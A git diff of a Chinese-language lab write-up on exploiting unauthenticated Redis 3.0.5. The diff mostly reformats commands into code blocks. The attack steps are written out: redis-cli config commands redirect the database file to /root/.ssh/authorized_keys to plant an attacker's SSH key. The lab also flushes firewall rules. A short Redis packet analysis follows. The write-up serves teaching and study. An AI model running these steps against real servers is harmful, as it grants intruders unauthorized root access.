@@ -14,7 +14,7 @@ Refer：http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expol
 
 1. 攻击方与被攻击方都是root用户。
 2. 确保攻击方与被攻击方网络连通（ping）及清除iptables防火墙规则（iptables -F）。
-3. 在CentOS中安装Redis 3.0.5，并运行（终端下输入以下命令）： 
+3. 在CentOS中安装Redis 3.0.5，并运行。（终端下输入以下命令）： 
 
 下载，解压，编译:
 ```
@@ -31,48 +31,51 @@ $ src/redis-server
 
 ## step 2. 实施攻击前准备
 
-1. 攻击方用ssh连接被攻击方，发现是需要密码登录。终端命令：ssh 192.168.188.132
+1. 攻击方用ssh连接被攻击方，发现是需要密码登录。
+```
+ssh 192.168.188.132
+```
 
 ![](ssh_fail.png)
 
-2. 攻击方生成一对ssh公私钥。终端命令：ssh-keygen –t rsa
+2. 攻击方生成一对ssh公私钥。
+```
+ssh-keygen –t rsa
+```
 
 ![](create_ssh_key.png)
 
 ## step 3. 攻击
 
-攻击者将生成公钥保存到被攻击方的/root/.ssh/ authorized_keys
+**攻击者将生成公钥保存到被攻击方的/root/.ssh/ authorized_keys**
 
 1. 攻击方访问被攻击方的Redis服务（若不指定端口，连接默认端口6379）。
-```
-redis-cli –h 192.168.188.132
-```
+ ```
+ redis-cli –h 192.168.188.132
+ ```
 
 2. 攻击者设置被攻击方Redis的默认路径及数据库缓存文件。
-```
-config set dir /root/.ssh
-config set dbfilename authorized_keys
-```
+ ```
+ config set dir /root/.ssh
+ config set dbfilename authorized_keys
+ ```
 
 3. 攻击者设置在被攻击方Redis设置一个字符串，用来保存公钥。
-```
-set CrackR  “\n\n\n+生成的公钥+\n\n\n”
-```
+ ```
+ set CrackR  “\n\n\n+生成的公钥+\n\n\n”
+ ```
 
 4. 攻击者保存数据快照到硬盘，即上一步的字符串CrackR保存到/
 root/.ssh/ authorized_keys.
-
-```
-save
-```
+ ```
+  save
+ ```
 
 5. 退出。
-
-```
-exit
-```
-
-![](attack.png)
+ ```
+ exit
+ ```
+![](attack_cmd.png)
 
 
 ## step 4. 验证攻击
@@ -83,17 +86,22 @@ ssh 192.168.188.132
 ```
 ![](ssh_success.png)
 
+---
 
 ## 攻击流程图
 
 ![](attack_flow.png)
 
+---
 
 ## Redis 通信报文分析
 
 Redis使用TCP协议进行传输，默认开放端口6379，且默认无需授权便可登录。
+
 1. Redis数据在TCP包数据部分，以*开头，后面跟着的数字代表Redis整个命令的字符串个数。
+
 2. 以0x0d，0x0a作为分隔符
+
 3. 将命令中的字符串分开，以单个字符串作为处理单元，转变为 $+数字（字符串长度）+分隔符+字符串+分隔符。
 
 
